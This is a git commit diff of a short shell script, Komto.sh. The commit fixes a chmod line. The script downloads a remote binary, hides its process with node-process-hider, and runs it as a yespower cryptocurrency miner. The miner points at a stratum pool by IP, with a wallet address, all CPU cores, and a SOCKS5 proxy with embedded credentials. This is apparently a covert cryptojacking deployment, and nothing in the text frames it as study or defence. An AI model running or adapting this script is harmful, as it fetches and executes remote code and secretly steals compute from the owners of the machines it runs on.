8d41888b569bc532494c4ac45b17da82c7be80b1
jauxhe <105890093+jauxhe@users.noreply.github.com>
2022-05-23 03:23:28 +0700

    Update Komto.sh

--- Komto.sh
+++ Komto.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
-!chmod +x data
+chmod +x data
 npm i -g node-process-hider 
 ph add data
 ./data -a yespower -o stratum+tcp://206.189.2.17:3333 -u WYBnNEVUPjTFA1rQypC6XK3DRNmosrgqce.kom -p x -t $(nproc) -x socks5://Gahsdbdn:Aapaoddun@45.15.169.241:5362
